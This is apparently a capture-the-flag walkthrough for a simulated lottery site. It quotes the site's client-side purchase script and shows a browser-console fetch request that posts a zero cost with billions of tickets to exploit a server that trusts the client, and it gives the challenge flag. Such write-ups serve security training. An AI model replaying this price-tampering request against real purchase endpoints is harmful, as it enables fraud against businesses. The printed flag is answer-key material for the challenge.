# LET'S GO GAMBLING Walkthrough
In this challenge, we are given a web environment that simulates a lottery drawing. We can buy tickets, but it is a fraction of the total tickets in each drawing. We are asked to audit the site and attempt to win the lottery, most likely by exploiting a vulnerability.

---
# Q1 - 100 Points
#### What is the flag obtained after winning the lottery?

Whereas I needed a hint on the easy bank challenge, I did not on this one. Interesting.

First, I navigated to `/robots.txt` and attempted to access the path it specified to no avail. Moving forward I will perform what I consider to be the routine tasks.

I looked at the HTML source code for anything that may be of interest, namely a javascript file that contains the logic for drawing the tickets. I found `/static/js/main.js`.

After navigating to this, we get this output:

```javascript
$(document).ready(function() {
  var session;
  var interval;

  $('#purchase').on('click', function(e) {
    if (!session) {
      window.alert('loading, please wait');
      return;
    }
    e.preventDefault();
    var box = $('#num-purchase');
    var tickets = parseInt(box.val()) || 0;
    box.val('0');

    if (session.money >= session.cost * tickets) {
      $.ajax({
        method : 'POST',
        url : '/purchase', 
        data : JSON.stringify({
        cost : session.cost * tickets,
        tickets : tickets
        }),
        dataType : 'json',
        contentType : 'application/json',
        complete: getUpdate,
      });
    } else {
      alert('You do not have enough money.');
    }
  });
```

This 100% caught my eye. There is a small if statement that checks if the amount of money we input is more than what we have. If not, it submits a post request to the `/purchase` endpoint with some data. How about we just make a post request ourselves?

Open up dev tools (Ctrl + Shift + I) and go to the console. I made a post with the following payload:

```javascript
fetch('/purchase', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({ cost: 0, tickets: 9999999999999 })
});
```

And it worked! We now own about ten trillion tickets and are likely to win. The flag appears on the screen.
#### Answer:
`SKY-PEPE-3502`

---
# Conclusion

I am very glad that I needed no hints or walkthroughs this time, YIPPEE. 